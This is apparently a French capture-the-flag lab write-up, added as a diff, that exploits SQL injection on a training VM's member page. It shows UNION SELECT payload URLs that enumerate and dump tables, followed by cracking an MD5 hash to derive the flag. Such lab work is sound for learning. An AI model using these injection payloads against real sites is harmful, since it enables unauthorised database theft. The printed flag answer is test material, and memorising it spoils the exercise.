@@ -1,0 +1,29 @@
+En continuant d'exploiter la faille sql sur la page member, j'ai pu constater l'existence de plusieurs tables dans differentes databases pour j'imagine diffenrents users sql voici la liste :
+
+	 TABLE 			| 		DB
+Member_Brute_Force	|	db_default
+users				|	Member_Sql_Injection
+guestbook			|	Member_guestbook
+list_images			|	Member_images
+vote_dbs			|	Member_survey
+
+Je tente de voir ce qu'il ya dans la table Member_brute_force : 
+
+http://192.168.56.105/?page=member&id=User_id UNION SELECT username, password FROM db_default.Member_Brute_Force&Submit
+
+et j'obtiens une error sql : SELECT command denied to user 'borntosec'@'localhost' for table 'Member_Brute_Force'
+
+OK, donc cette page php utilise le user 'borntosec' afin d'executer les requetes sql, mais cet utilisateur n'a apparemment pas les droits sur la bdd 'db_default' ou du moins sur la table 'Member_Brute_Force'.
+
+En affichant la table guestbook, je ne trouve rien de plus que ce qui est affiche sur la page guestbook et j'ai deja le flag de cette page donc je passe a la table list_images et en affichant le contenu des colonnes comment et url de chaque ligne, on on peut voir une ligne interessante :
+
+requete sql :
+	http://192.168.56.105/?page=member&id=User_id UNION SELECT comment, url FROM Member_images.list_images&Submit
+resultat :
+ID: User_id UNION SELECT comment, url FROM Member_images.list_images
+First name: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
+Surname : borntosec.ddns.net/images.png
+
+et donc on a plus qu'a faire comme pour le flag precedent pour obtenir le flag:
+	- on decode 1928e8083cf461a51303633093573c46, ce qui donne : albatroz
+	- on encrypt 'albatroz' en sha256 et voila notre flag : Sha256(albatroz) = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
